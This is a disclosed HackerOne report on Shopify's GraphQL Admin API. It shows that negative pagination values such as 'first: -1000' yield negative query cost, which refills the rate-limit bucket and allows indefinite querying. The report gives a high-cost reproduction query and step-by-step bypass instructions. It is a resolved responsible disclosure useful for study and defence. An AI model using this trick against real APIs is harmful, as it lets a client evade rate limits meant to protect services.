---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '481518'
original_report_id: '481518'
title: Bypass GraphQL rate limit by abusing negative cost queries
weakness: Business Logic Errors
team_handle: shopify
created_at: '2019-01-17T16:51:07.923Z'
disclosed_at: '2019-01-24T15:29:24.263Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 20
asset_identifier: your-store.myshopify.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- business-logic-errors
---

# Bypass GraphQL rate limit by abusing negative cost queries

## Metadata

- HackerOne Report ID: 481518
- Weakness: Business Logic Errors
- Program: shopify
- Disclosed At: 2019-01-24T15:29:24.263Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi security team,

While looking into the graphql app I noticed an interesting implementation where each app has a bucket of query cost they are allowed to used in a given time with a certain refresh rate associated with it.

The details can be found at https://help.shopify.com/en/api/graphql-admin-api/call-limit

Now Using the app I noticed by calling something like `first(-100)` will give you a negative cost 
{F408086}

This doesn't give you more than the maximum amount however you can deplete your resources down to 50 and then use a negative query to fill it back up to a maximum of 1000 to keep querying indefinitely.

In order to reproduce I used a high cost query like:
```
{
  appInstallations(first: 10) {
    edges {
      node {
        id
        uninstallUrl
        accessScopes {
          description
          handle
        }
        accessScopes {
          description
          handle
        }
        accessScopes {
          description
          handle
        }
        accessScopes {
          description
          handle
        }
        launchUrl
        app {
          pricingDetailsSummary
          apiKey
          banner {
            altText
            metafields(first: 2) {
              edges {
                node {
                  description
                  value
                  namespace
                  id
                }
              }
            }
          }
          handle
          features
          pricingDetails
          published
          feedback {
            messages {
              message
            }
            link {
              url
            }
          }
        }
      }
    }
  }
}
```
And hit sent 10-15 times at https://emitrani.myshopify.com/admin/apps/shopify-graphiql-app

After that change one of the `first` parameters into `(first: -1000)` and try a regular query again and you will see it succeeds as the pool will be back up to full.

## Impact

It is possible to leverage the logic error to bypass GraphQL rate limiting.

Best,
Eray

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
